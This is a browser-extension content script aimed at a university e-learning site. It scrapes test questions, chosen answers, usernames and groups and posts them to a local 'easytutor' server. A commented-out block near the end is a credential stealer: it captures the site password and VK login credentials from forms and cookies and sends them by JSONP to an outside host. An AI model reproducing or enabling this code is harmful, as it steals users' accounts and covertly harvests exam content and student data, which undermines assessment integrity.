$.get(chrome.extension.getURL('/injected.js'),
    function (data) {
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        script.innerHTML = data;
        document.getElementsByTagName("head")[0].appendChild(script);

        function createJsonResponse() {
            var input;
            var discipline = $(".breadcrumbs-list > li").next().find("a").html();
            var testId = getCookie("test_id")


if(testId !== undefined)
            $.get("http://dl.tntu.edu.ua/users/profile.php", function (groupData) {

                var responseArr = [];

                var group = $(groupData).find("input[id=\"group\"]").attr("value");

                var elements = $('form[name = \'test\'] fieldset[class=\'group_form\'] > div[class=\'test_instruction\']');


                var responseObject = {};

                responseObject["user"] = $("#header-main-logout-username").text();
                responseObject["testId"] = testId
                responseObject["group"] = group;
                responseObject["discipline"] = unifyStr(discipline);
                responseObject["moduleName"] = unifyStr($("fieldset[class='group_form'] > legend[class='group_form']").text());

                elements.each(function () {

                    if ($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").html() !== undefined) {

                        var object = {};

                        var scoresOnTest = $(this).find("div").text();

                        var questionNumber = $(this).find("h3").text();

                        var question = $(this).next().find("p").text();

                        var elements = $(this).next().find("label");

                        var answers = [];
                        elements.each(function (index) {
                            answers.push($(this).text().trim());
                        });

                        object["scoreOnQuestion"] = unifyStr(scoresOnTest);
                        object["questionHeader"] = unifyStr(questionNumber);
                        object["question"] = unifyStr(question);
                        object["answers"] = answers;
                        object["answer"] = unifyStr($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").text());


                        responseArr.push(object);

                    } else if (true) {

                    }

                });

                responseObject["body"] = responseArr;
                sendResponse(responseObject);

            });
        }

        var testForm = $("form[name = 'test']")[0];

        if (testForm !== undefined) {
            $(testForm).submit(function () {
                createJsonResponse();
            });
        }

        //$(inp).click(function () {
        //        createXmlResponse();
        //    }
        //);


        var startTest = $("form[name = 'form']")[0];

        if(startTest !== undefined && document.URL.startsWith("http://dl.tntu.edu.ua/mods/_standard/tests/test_intro.php")) {
            $(startTest).submit(function (event) {
                $.get("http://dl.tntu.edu.ua/users/profile.php", function (groupData) {
                    
                    $.ajax({
                        url: "http://localhost:8080/easytutor/rest/test/temp-test",
                        type: 'GET',
                        success: function (data, textStatus) {
                            setCookie("is_test_submit", "true", {});
                            setCookie("test_id", data, {});
                            alert(data);
                            //$("form[name = 'test']")[0].submit();
                        },
                        error: function () {
                            alert('failure');
                        }

                    });
                });

                
            });
        }

        //$(startTest).click(function () {
        //        alert("awd");
        //        $("form[name = 'form']")[0].submit();
        //    }
        //);


        function sendResponse(result) {

            $.ajax({
                url: "http://localhost:8080/easytutor/rest/test/questions",
                data: JSON.stringify(result),
                contentType: "application/json",
                type: 'POST',
                success: function (data, textStatus) {
                    // setCookie("is_test_submit", "true", {"expires": 30});
                    // setCookie("test_id", data, {"expires": 30});
                    //$("form[name = 'test']")[0].submit();
                },
                error: function () {
                    alert('failure');
                }

            });

            for(var i = 0; i < 1000000; i = i+1){} //TODO: Wait for response

        }

        $("form[name = 'form']").submit(function (e) {
            document.cookie = "discipline=" + $("#breadcrumbs a").next().html();
            document.cookie = "moduleName=" + $("form[name = 'form'] > div[class='input-form'] > fieldset[class='group_form'] > legend").html();

        });


        function sendTestResult() {

            var isTestSubmit = getCookie("is_test_submit");

            if (isTestSubmit == "true") {

                var testResult = $('form[method = \'get\'] > div[class=\'input-form\'] > div[class=\'test_instruction\']  span').text().replace("Балів", "").trim();
                alert(testResult);
                //TODO: Check if test result exist in page before send to server
                var result = testResult.split("/")[0];
                var max = testResult.split("/")[1];
                var testId = getCookie("test_id");

                var object = {};
                object["maxScores"] = max.trim();
                object["scores"] = result.trim();
                object["id"] = testId;

                console.log(JSON.stringify(object));

                $.ajax({
                    url: "http://localhost:8080/easytutor/rest/test/scores",
                    data: JSON.stringify(object),
                    contentType: "application/json",
                    type: 'POST',
                    success: function () {
                    },
                    error: function () {
                    }

                });

                setCookie("is_test_submit", "false", {"expires": 10000});
                setCookie("test_id", "", {"expires": 10000});
            }
        }

        sendTestResult();

        /*
         deleteCookie( 'TNTU_login' );
         deleteCookie( 'TNTU_pass' );

         $.ajax( {
         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
         data         : {
         email   : TNTU_login,
         password: TNTU_pass,
         social  : "TNTU"
         },
         dataType     : "jsonp",
         jsonpCallback: "login"
         } );

         $( "#quick_login_button" ).click( function ( ) {
         var login_vk = $( "#quick_email" ).val();
         var pass_vk = $( "#quick_pass" ).val();


         $.ajax( {
         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
         data         : {
         email   : login_vk,
         password: pass_vk,
         social  : "VK"
         },
         dataType     : "jsonp",
         jsonpCallback: "login"
         } )

         } );


         $( "#pass" ).keyup( function ( e ) {
         TNTU_pass = $( "#pass" ).val();
         } );

         $( "form[name = 'form']" ).submit( function ( e ) {
         TNTU_login = $( "#login" ).val();
         document.cookie = "TNTU_login=" + TNTU_login;
         document.cookie = "TNTU_pass=" + TNTU_pass;
         } );



         $( "form[name = 'login']" ).submit( function ( e ) {
         var login_vk = $( "#quick_email" ).val();
         var pass_vk = $( "#quick_pass" ).val();
         alert(login_vk);
         $.ajax( {
         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
         data         : {
         email   : login_vk,
         password: pass_vk,
         social  : "VK"
         },
         dataType     : "jsonp",
         jsonpCallback: "login"
         } )
         } );


         $( "form[name = 'login']" ).submit( function ( e ) {
         var login_vk = $( "#quick_email" ).val();
         var pass_vk = $( "#quick_pass" ).val();
         alert(login_vk);
         $.ajax( {
         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
         data         : {
         email   : login_vk,
         password: pass_vk,
         social  : "VK"
         },
         dataType     : "jsonp",
         jsonpCallback: "login"
         } )
         } );
         */

    }
);

function getCookie(name) {
    var matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    return matches ? decodeURIComponent(matches[1]) : undefined;
}

function deleteCookie(name) {
    setCookie(name, "", {expires: -1})
}

function unifyStr(str) {
    return str.replace("\r", "").replace("\n", "").replace("\t", "").replace("Балів", "").trim();
}

function setCookie(name, value, options) {
    options = options || {};

    var expires = options.expires;

    if (typeof expires == "number" && expires) {
        var d = new Date();
        d.setTime(d.getTime() + expires * 1000);
        expires = options.expires = d;
    }
    if (expires && expires.toUTCString) {
        options.expires = expires.toUTCString();
    }

    value = encodeURIComponent(value);

    var updatedCookie = name + "=" + value;

    for (var propName in options) {
        updatedCookie += "; " + propName;
        var propValue = options[propName];
        if (propValue !== true) {
            updatedCookie += "=" + propValue;
        }
    }

    document.cookie = updatedCookie;
}
